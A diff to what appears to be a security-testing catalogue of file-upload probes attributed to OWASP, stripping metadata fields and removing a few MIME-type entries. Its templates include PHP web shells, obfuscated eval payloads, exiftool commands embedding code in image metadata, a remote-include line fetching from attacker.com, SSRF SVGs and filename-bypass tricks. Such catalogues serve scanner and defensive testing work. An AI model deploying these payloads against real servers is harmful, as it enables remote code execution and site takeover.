     "template": "</FilesMatch>",
-    "description": ".htaccess to Bypass Upload Restrictions probe from OWASP. Tests application handling of: </FilesMatch>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": ".htaccess to Bypass Upload Restrictions probe from OWASP. Tests application handling of: </FilesMatch>"
   },
   {
     "id": "file-upload-owasp-0232",
     "name": "WEB.CONFIG FILE UPLOAD (IIS)",
     "template": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <?xml version=\"1.0\" encoding=\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <?xml version=\"1.0\" encoding=\"..."
   },
   {
     "id": "file-upload-owasp-0233",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #2",
     "template": "<configuration>",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <configuration>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <configuration>"
   },
   {
     "id": "file-upload-owasp-0234",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #3",
     "template": "<system.webServer>",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <system.webServer>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <system.webServer>"
   },
   {
     "id": "file-upload-owasp-0235",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #4",
     "template": "<handlers>",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <handlers>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <handlers>"
   },
   {
     "id": "file-upload-owasp-0236",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #5",
     "template": "<add name=\"PHP_via_FastCGI\"",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <add name=\"PHP_via_FastCGI\"",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: <add name=\"PHP_via_FastCGI\""
   },
   {
     "id": "file-upload-owasp-0237",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #6",
     "template": "path=\"*.jpg\"",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: path=\"*.jpg\"",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: path=\"*.jpg\""
   },
   {
     "id": "file-upload-owasp-0238",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #7",
     "template": "verb=\"*\"",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: verb=\"*\"",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: verb=\"*\""
   },
   {
     "id": "file-upload-owasp-0239",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #8",
     "template": "modules=\"FastCgiModule\"",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: modules=\"FastCgiModule\"",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: modules=\"FastCgiModule\""
   },
   {
     "id": "file-upload-owasp-0240",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #9",
     "template": "scriptProcessor=\"C:\\PHP\\php-cgi.exe\"",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: scriptProcessor=\"C:\\PHP\\php-cg...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: scriptProcessor=\"C:\\PHP\\php-cg..."
   },
   {
     "id": "file-upload-owasp-0241",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #10",
     "template": "resourceType=\"Unspecified\" />",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: resourceType=\"Unspecified\" />",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: resourceType=\"Unspecified\" />"
   },
   {
     "id": "file-upload-owasp-0242",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #11",
     "template": "</handlers>",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: </handlers>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: </handlers>"
   },
   {
     "id": "file-upload-owasp-0243",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #12",
     "template": "</system.webServer>",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: </system.webServer>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: </system.webServer>"
   },
   {
     "id": "file-upload-owasp-0244",
     "name": "WEB.CONFIG FILE UPLOAD (IIS) #13",
     "template": "</configuration>",
-    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: </configuration>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WEB.CONFIG FILE UPLOAD (IIS) probe from OWASP. Tests application handling of: </configuration>"
   },
   {
     "id": "file-upload-owasp-0245",
     "name": "EXIF Data with XSS (if displayed)",
     "template": "exiftool -Comment='<script>alert(1)</script>' image.jpg",
-    "description": "EXIF Data with XSS (if displayed) probe from OWASP. Tests application handling of: exiftool -Comment='<script>ale...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "EXIF Data with XSS (if displayed) probe from OWASP. Tests application handling of: exiftool -Comment='<script>ale..."
   },
   {
     "id": "file-upload-owasp-0246",
     "name": "EXIF Data with PHP Code",
     "template": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg",
-    "description": "EXIF Data with PHP Code probe from OWASP. Tests application handling of: exiftool -Comment='<?php syste...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "EXIF Data with PHP Code probe from OWASP. Tests application handling of: exiftool -Comment='<?php syste..."
   },
   {
     "id": "file-upload-owasp-0247",
     "name": "IPTC Data Injection",
     "template": "exiftool -IPTC:Caption-Abstract='<?php eval($_POST[\"x\"]); ?>' image.jpg",
-    "description": "IPTC Data Injection probe from OWASP. Tests application handling of: exiftool -IPTC:Caption-Abstrac...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "IPTC Data Injection probe from OWASP. Tests application handling of: exiftool -IPTC:Caption-Abstrac..."
   },
   {
     "id": "file-upload-owasp-0248",
     "name": "Apache",
     "template": "shell.php.jpg (with .htaccess: AddType application/x-httpd-php .jpg)",
-    "description": "Apache probe from OWASP. Tests application handling of: shell.php.jpg (with .htaccess:...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Apache probe from OWASP. Tests application handling of: shell.php.jpg (with .htaccess:..."
   },
   {
     "id": "file-upload-owasp-0249",
     "name": "Apache #2",
     "template": ".htaccess file to execute images as PHP",
-    "description": "Apache probe from OWASP. Tests application handling of: .htaccess file to execute imag...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Apache probe from OWASP. Tests application handling of: .htaccess file to execute imag..."
   },
   {
     "id": "file-upload-owasp-0250",
     "name": "IIS",
     "template": "shell.asp;.jpg",
-    "description": "IIS probe from OWASP. Tests application handling of: shell.asp;.jpg",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "IIS probe from OWASP. Tests application handling of: shell.asp;.jpg"
   },
   {
     "id": "file-upload-owasp-0251",
     "name": "IIS #2",
     "template": "shell.asp:.jpg",
-    "description": "IIS probe from OWASP. Tests application handling of: shell.asp:.jpg",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "IIS probe from OWASP. Tests application handling of: shell.asp:.jpg"
   },
   {
     "id": "file-upload-owasp-0252",
     "name": "IIS #3",
     "template": "web.config to execute images as ASP",
-    "description": "IIS probe from OWASP. Tests application handling of: web.config to execute images a...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "IIS probe from OWASP. Tests application handling of: web.config to execute images a..."
   },
   {
     "id": "file-upload-owasp-0253",
     "name": "Nginx",
     "template": "shell.php%00.jpg (older versions)",
-    "description": "Nginx probe from OWASP. Tests application handling of: shell.php%00.jpg (older versio...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Nginx probe from OWASP. Tests application handling of: shell.php%00.jpg (older versio..."
   },
   {
     "id": "file-upload-owasp-0254",
     "name": "Nginx #2",
     "template": "Upload to misconfigured alias/location",
-    "description": "Nginx probe from OWASP. Tests application handling of: Upload to misconfigured alias/...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Nginx probe from OWASP. Tests application handling of: Upload to misconfigured alias/..."
   },
   {
     "id": "file-upload-owasp-0255",
     "name": "Tomcat",
     "template": "shell.jsp%00.jpg",
-    "description": "Tomcat probe from OWASP. Tests application handling of: shell.jsp%00.jpg",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Tomcat probe from OWASP. Tests application handling of: shell.jsp%00.jpg"
   },
   {
     "id": "file-upload-owasp-0256",
     "name": "Small malicious file",
     "template": "<?=`$_GET[0]`?>",
-    "description": "Small malicious file probe from OWASP. Tests application handling of: <?=`$_GET[0]`?>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Small malicious file probe from OWASP. Tests application handling of: <?=`$_GET[0]`?>"
   },
   {
     "id": "file-upload-owasp-0257",
     "name": "Compressed PHP shell",
     "template": "<?=`{$_GET[0]}`;",
-    "description": "Compressed PHP shell probe from OWASP. Tests application handling of: <?=`{$_GET[0]}`;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0258",
-    "name": "Upload with different MIME types",
-    "template": "Content-Type: application/x-php",
-    "description": "Upload with different MIME types probe from OWASP. Tests application handling of: Content-Type: application/x-ph...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0259",
-    "name": "Upload with different MIME types #2",
-    "template": "Content-Type: application/x-httpd-php",
-    "description": "Upload with different MIME types probe from OWASP. Tests application handling of: Content-Type: application/x-ht...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0260",
-    "name": "Upload with different MIME types #3",
-    "template": "Content-Type: application/php",
-    "description": "Upload with different MIME types probe from OWASP. Tests application handling of: Content-Type: application/php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0261",
-    "name": "Upload with different MIME types #4",
-    "template": "Content-Type: text/php",
-    "description": "Upload with different MIME types probe from OWASP. Tests application handling of: Content-Type: text/php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0262",
-    "name": "Upload with different MIME types #5",
-    "template": "Content-Type: text/x-php",
-    "description": "Upload with different MIME types probe from OWASP. Tests application handling of: Content-Type: text/x-php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Compressed PHP shell probe from OWASP. Tests application handling of: <?=`{$_GET[0]}`;"
   },
   {
     "id": "file-upload-owasp-0263",
     "name": "PDF + HTML Polyglot",
     "template": "<html><script>alert(1)</script></html>",
-    "description": "PDF + HTML Polyglot probe from OWASP. Tests application handling of: <html><script>alert(1)</script...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "PDF + HTML Polyglot probe from OWASP. Tests application handling of: <html><script>alert(1)</script..."
   },
   {
     "id": "file-upload-owasp-0264",
     "name": "GIF + JavaScript",
     "template": "GIF89a/*<?php",
-    "description": "GIF + JavaScript probe from OWASP. Tests application handling of: GIF89a/*<?php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "GIF + JavaScript probe from OWASP. Tests application handling of: GIF89a/*<?php"
   },
   {
     "id": "file-upload-owasp-0265",
     "name": "GIF + JavaScript #2",
     "template": "<script>alert(1)</script>",
-    "description": "GIF + JavaScript probe from OWASP. Tests application handling of: <script>alert(1)</script>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "GIF + JavaScript probe from OWASP. Tests application handling of: <script>alert(1)</script>"
   },
   {
     "id": "file-upload-owasp-0266",
     "name": "GIF + JavaScript #3",
     "template": "<?php */;",
-    "description": "GIF + JavaScript probe from OWASP. Tests application handling of: <?php */;",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "GIF + JavaScript probe from OWASP. Tests application handling of: <?php */;"
   },
   {
     "id": "file-upload-owasp-0267",
     "name": "Unicode Normalization",
     "template": "shell.php%E2%80%AE.jpg (Right-to-Left Override)",
-    "description": "Unicode Normalization probe from OWASP. Tests application handling of: shell.php%E2%80%AE.jpg (Right-...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Unicode Normalization probe from OWASP. Tests application handling of: shell.php%E2%80%AE.jpg (Right-..."
   },
   {
     "id": "file-upload-owasp-0268",
     "name": "Unicode Normalization #2",
     "template": "shell\u202egpj.php (RLO character)",
-    "description": "Unicode Normalization probe from OWASP. Tests application handling of: shell\u202egpj.php (RLO character)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Unicode Normalization probe from OWASP. Tests application handling of: shell\u202egpj.php (RLO character)"
   },
   {
     "id": "file-upload-owasp-0269",
     "name": "Homoglyph Attacks",
     "template": "shell.\u0440h\u0440 (Cyrillic \u0440 instead of Latin p)",
-    "description": "Homoglyph Attacks probe from OWASP. Tests application handling of: shell.\u0440h\u0440 (Cyrillic \u0440 instead ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Homoglyph Attacks probe from OWASP. Tests application handling of: shell.\u0440h\u0440 (Cyrillic \u0440 instead ..."
   },
   {
     "id": "file-upload-owasp-0270",
     "name": "Homoglyph Attacks #2",
     "template": "shell.\u0440h\u0440",
-    "description": "Homoglyph Attacks probe from OWASP. Tests application handling of: shell.\u0440h\u0440",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Homoglyph Attacks probe from OWASP. Tests application handling of: shell.\u0440h\u0440"
   },
   {
     "id": "file-upload-owasp-0271",
     "name": "UTF-8 BOM",
     "template": "\ufeff<?php system($_GET['cmd']); ?>",
-    "description": "UTF-8 BOM probe from OWASP. Tests application handling of: \ufeff<?php system($_GET['cmd']); ?...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "UTF-8 BOM probe from OWASP. Tests application handling of: \ufeff<?php system($_GET['cmd']); ?..."
   },
   {
     "id": "file-upload-owasp-0272",
     "name": "Multiple Content-Disposition",
     "template": "Content-Disposition: form-data; name=\"file\"; filename=\"safe.jpg\"",
-    "description": "Multiple Content-Disposition probe from OWASP. Tests application handling of: Content-Disposition: form-data...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Multiple Content-Disposition probe from OWASP. Tests application handling of: Content-Disposition: form-data..."
   },
   {
     "id": "file-upload-owasp-0273",
     "name": "Multiple Content-Disposition #2",
     "template": "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"",
-    "description": "Multiple Content-Disposition probe from OWASP. Tests application handling of: Content-Disposition: form-data...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Multiple Content-Disposition probe from OWASP. Tests application handling of: Content-Disposition: form-data..."
   },
   {
     "id": "file-upload-owasp-0274",
     "name": "Null Session (Windows)",
     "template": "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\shell.php",
-    "description": "Null Session (Windows) probe from OWASP. Tests application handling of: \\\\127.0.0.1\\c$\\inetpub\\wwwroot...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Null Session (Windows) probe from OWASP. Tests application handling of: \\\\127.0.0.1\\c$\\inetpub\\wwwroot..."
   },
   {
     "id": "file-upload-owasp-0275",
     "name": "Case Sensitivity Issues",
     "template": "ShElL.PhP",
-    "description": "Case Sensitivity Issues probe from OWASP. Tests application handling of: ShElL.PhP",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Sensitivity Issues probe from OWASP. Tests application handling of: ShElL.PhP"
   },
   {
     "id": "file-upload-owasp-0276",
     "name": "Case Sensitivity Issues #2",
     "template": "SHELL.php",
-    "description": "Case Sensitivity Issues probe from OWASP. Tests application handling of: SHELL.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Sensitivity Issues probe from OWASP. Tests application handling of: SHELL.php"
   },
   {
     "id": "file-upload-owasp-0277",
     "name": "Case Sensitivity Issues #3",
     "template": "Shell.PHP",
-    "description": "Case Sensitivity Issues probe from OWASP. Tests application handling of: Shell.PHP",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Sensitivity Issues probe from OWASP. Tests application handling of: Shell.PHP"
   },
   {
     "id": "file-upload-owasp-0278",
     "name": "WordPress",
     "template": "wp-content/uploads/shell.php",
-    "description": "WordPress probe from OWASP. Tests application handling of: wp-content/uploads/shell.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WordPress probe from OWASP. Tests application handling of: wp-content/uploads/shell.php"
   },
   {
     "id": "file-upload-owasp-0279",
     "name": "WordPress #2",
     "template": "wp-content/themes/shell.php",
-    "description": "WordPress probe from OWASP. Tests application handling of: wp-content/themes/shell.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WordPress probe from OWASP. Tests application handling of: wp-content/themes/shell.php"
   },
   {
     "id": "file-upload-owasp-0280",
     "name": "WordPress #3",
     "template": "wp-content/plugins/shell.php",
-    "description": "WordPress probe from OWASP. Tests application handling of: wp-content/plugins/shell.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "WordPress probe from OWASP. Tests application handling of: wp-content/plugins/shell.php"
   },
   {
     "id": "file-upload-owasp-0281",
     "name": "Drupal",
     "template": "sites/default/files/shell.php",
-    "description": "Drupal probe from OWASP. Tests application handling of: sites/default/files/shell.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Drupal probe from OWASP. Tests application handling of: sites/default/files/shell.php"
   },
   {
     "id": "file-upload-owasp-0282",
     "name": "Joomla",
     "template": "media/shell.php",
-    "description": "Joomla probe from OWASP. Tests application handling of: media/shell.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Joomla probe from OWASP. Tests application handling of: media/shell.php"
   },
   {
     "id": "file-upload-owasp-0283",
     "name": "Joomla #2",
     "template": "images/shell.php",
-    "description": "Joomla probe from OWASP. Tests application handling of: images/shell.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Joomla probe from OWASP. Tests application handling of: images/shell.php"
   },
   {
     "id": "file-upload-owasp-0284",
     "name": "Laravel",
     "template": "storage/app/shell.php",
-    "description": "Laravel probe from OWASP. Tests application handling of: storage/app/shell.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Laravel probe from OWASP. Tests application handling of: storage/app/shell.php"
   },
   {
     "id": "file-upload-owasp-0285",
     "name": "Laravel #2",
     "template": "public/uploads/shell.php",
-    "description": "Laravel probe from OWASP. Tests application handling of: public/uploads/shell.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Laravel probe from OWASP. Tests application handling of: public/uploads/shell.php"
   },
   {
     "id": "file-upload-owasp-0286",
     "name": "Django",
     "template": "media/uploads/shell.py",
-    "description": "Django probe from OWASP. Tests application handling of: media/uploads/shell.py",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Django probe from OWASP. Tests application handling of: media/uploads/shell.py"
   },
   {
     "id": "file-upload-owasp-0287",
     "name": "Upload file containing:",
     "template": "<?php include($_GET['file']); ?>",
-    "description": "Upload file containing: probe from OWASP. Tests application handling of: <?php include($_GET['file']); ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Upload file containing: probe from OWASP. Tests application handling of: <?php include($_GET['file']); ..."
   },
   {
     "id": "file-upload-owasp-0288",
     "name": "Upload file containing: #2",
     "template": "<?php require($_GET['file']); ?>",
-    "description": "Upload file containing: probe from OWASP. Tests application handling of: <?php require($_GET['file']); ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Upload file containing: probe from OWASP. Tests application handling of: <?php require($_GET['file']); ..."
   },
   {
     "id": "file-upload-owasp-0289",
     "name": "Upload file containing: #3",
     "template": "<?php include_once($_GET['file']); ?>",
-    "description": "Upload file containing: probe from OWASP. Tests application handling of: <?php include_once($_GET['file...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Upload file containing: probe from OWASP. Tests application handling of: <?php include_once($_GET['file..."
   },
   {
     "id": "file-upload-owasp-0290",
     "name": "Then access with:",
     "template": "?file=http://attacker.com/shell.txt",
-    "description": "Then access with: probe from OWASP. Tests application handling of: ?file=http://attacker.com/shel...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Then access with: probe from OWASP. Tests application handling of: ?file=http://attacker.com/shel..."
   },
   {
     "id": "file-upload-owasp-0291",
     "name": "Then access with: #2",
     "template": "?file=php://input (with POST data containing PHP code)",
-    "description": "Then access with: probe from OWASP. Tests application handling of: ?file=php://input (with POST d...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Then access with: probe from OWASP. Tests application handling of: ?file=php://input (with POST d..."
   },
   {
     "id": "file-upload-owasp-0292",
     "name": "Then access with: #3",
     "template": "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
-    "description": "Then access with: probe from OWASP. Tests application handling of: ?file=data://text/plain;base64...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Then access with: probe from OWASP. Tests application handling of: ?file=data://text/plain;base64..."
   },
   {
     "id": "file-upload-owasp-0293",
     "name": "Upload file that triggers SSRF",
     "template": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">",
-    "description": "Upload file that triggers SSRF probe from OWASP. Tests application handling of: <svg xmlns=\"http://www.w3.org/...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Upload file that triggers SSRF probe from OWASP. Tests application handling of: <svg xmlns=\"http://www.w3.org/..."
   },
   {
     "id": "file-upload-owasp-0294",
     "name": "Upload file that triggers SSRF #2",
     "template": "<image xlink:href=\"http://internal-server/admin\"/>",
-    "description": "Upload file that triggers SSRF probe from OWASP. Tests application handling of: <image xlink:href=\"http://inte...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Upload file that triggers SSRF probe from OWASP. Tests application handling of: <image xlink:href=\"http://inte..."
   },
   {
     "id": "file-upload-owasp-0295",
     "name": "EICAR TEST FILE (AV Bypass Testing)",
     "template": "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
-    "description": "EICAR TEST FILE (AV Bypass Testing) probe from OWASP. Tests application handling of: X5O!P%@AP[4\\PZX54(P^)7CC)7}$EI...",
-    "enabled": true,
-    "sourceType": "OWASP, PayloadsAllTheThings",
-    "sourceFile": "file-upload-payloads.txt, eicar.txt"
+    "description": "EICAR TEST FILE (AV Bypass Testing) probe from OWASP. Tests application handling of: X5O!P%@AP[4\\PZX54(P^)7CC)7}$EI..."
   },
   {
     "id": "file-upload-owasp-0296",
     "name": "Base64 Encoded Shell",
     "template": "<?php eval(base64_decode(\"c3lzdGVtKCRfR0VUWydjbWQnXSk7\")); ?>",
-    "description": "Base64 Encoded Shell probe from OWASP. Tests application handling of: <?php eval(base64_decode(\"c3lz...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Base64 Encoded Shell probe from OWASP. Tests application handling of: <?php eval(base64_decode(\"c3lz..."
   },
   {
     "id": "file-upload-owasp-0297",
     "name": "Hex Encoded",
     "template": "<?php eval(hex2bin(\"73797374656d28245f4745545b27636d64275d293b\")); ?>",
-    "description": "Hex Encoded probe from OWASP. Tests application handling of: <?php eval(hex2bin(\"7379737465...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Hex Encoded probe from OWASP. Tests application handling of: <?php eval(hex2bin(\"7379737465..."
   },
   {
     "id": "file-upload-owasp-0298",
     "name": "ROT13",
     "template": "<?php eval(str_rot13(\"flfgrz($_TRG['pzq']);\")); ?>",
-    "description": "ROT13 probe from OWASP. Tests application handling of: <?php eval(str_rot13(\"flfgrz($...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ROT13 probe from OWASP. Tests application handling of: <?php eval(str_rot13(\"flfgrz($..."
   },
   {
     "id": "file-upload-owasp-0299",
     "name": "ALTERNATIVE DATA STREAMS (Windows/NTFS)",
     "template": "shell.asp::$DATA",
-    "description": "ALTERNATIVE DATA STREAMS (Windows/NTFS) probe from OWASP. Tests application handling of: shell.asp::$DATA",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ALTERNATIVE DATA STREAMS (Windows/NTFS) probe from OWASP. Tests application handling of: shell.asp::$DATA"
   },
   {
     "id": "file-upload-owasp-0300",
     "name": "ALTERNATIVE DATA STREAMS (Windows/NTFS) #2",
     "template": "payload.txt:hidden.php",
-    "description": "ALTERNATIVE DATA STREAMS (Windows/NTFS) probe from OWASP. Tests application handling of: payload.txt:hidden.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "ALTERNATIVE DATA STREAMS (Windows/NTFS) probe from OWASP. Tests application handling of: payload.txt:hidden.php"
   }
 ]
